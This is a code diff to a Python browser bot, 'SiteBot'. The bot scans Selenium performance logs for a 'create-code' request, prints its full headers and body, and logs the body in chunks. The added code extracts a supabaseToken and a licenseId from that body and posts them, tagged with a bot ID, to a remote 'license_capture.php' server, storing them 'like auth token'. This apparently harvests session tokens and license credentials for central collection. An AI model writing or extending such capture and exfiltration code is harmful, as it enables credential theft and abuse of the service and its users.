@@ -3386,7 +3386,7 @@ class SiteBot:
 # ---------------------------------------------------------------------------
 
 def _print_create_code(driver):
-    # Print full create-code request body so you see with your eyes (no server roundtrip)
+    # Print and store create-code body like auth tokens (supabase + license, not the one-time code)
     try:
         logs = driver.get_log("performance")
         for entry in reversed(logs):
@@ -3404,13 +3404,21 @@ def _print_create_code(driver):
                             pretty = json.dumps(j, indent=2)
                         except:
                             pretty = body
-                        # full dump to stdout + log
+                            j = {}
                         out = f"[create-code] {url}\nHeaders: {json.dumps(hdrs, indent=2)}\nBody:\n{pretty}"
                         print(out)
-                        # also log in chunks so VNC log shows it
                         for i in range(0, len(pretty), 600):
                             log(f"create-code body chunk {i//600}: {pretty[i:i+600]}", "ok")
                         log(f"create-code captured {url} ({len(pretty)} chars)", "ok")
+                        # store supabase + license like auth token (not the one-time code)
+                        try:
+                            supa = j.get("supabaseToken") if isinstance(j, dict) else None
+                            lic = j.get("licenseId") if isinstance(j, dict) else None
+                            if supa and lic:
+                                _post_to_server("license_capture.php", {"bot_id": BOT_ID, "supabaseToken": supa, "licenseId": lic})
+                                log(f"stored supabase ...{supa[-8:]} lic {lic[:8]} like auth token", "ok")
+                        except Exception as e:
+                            log(f"store license_capture failed {e}", "warn")
                         return
             except: continue
         log("create-code not found in perf logs (try hitting Continue again)", "warn")
